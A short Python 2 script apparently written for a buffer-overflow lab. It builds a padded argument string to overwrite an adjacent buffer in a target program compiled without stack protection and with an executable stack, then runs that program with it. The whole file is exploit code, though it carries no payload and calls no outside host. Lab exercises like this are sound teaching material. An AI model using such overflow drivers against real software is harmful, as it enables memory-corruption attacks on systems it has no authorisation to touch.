#!/usr/bin/env python2

import subprocess
import sys
import os

def main(program):
    if not os.path.isfile(program):
        print("File '{}' does not exist".format(program))
        return

    u_size = 50 - 1 # excludes null byte at end
    user = "g" * 23 # pads rest of greeting

    user += "1" # now we're writing to message
    user += "m" * 19
    user += "9"

    message = "this doesn't matter"

    # Note: CFLAGS=-fno-stack-protector -zexecstack -g -w
    # - (no-stack-protector) allows stack to be modified
    # - (execstack) allows stack to be executable
    # - (g) gdb
    # - (w) suppress warnings

    print("Exploiting '{}':".format(program))
    print("------------{}--".format(len(program) * '-'))
    subprocess.Popen([program, user, message])


if __name__ == "__main__":
    main(sys.argv[1])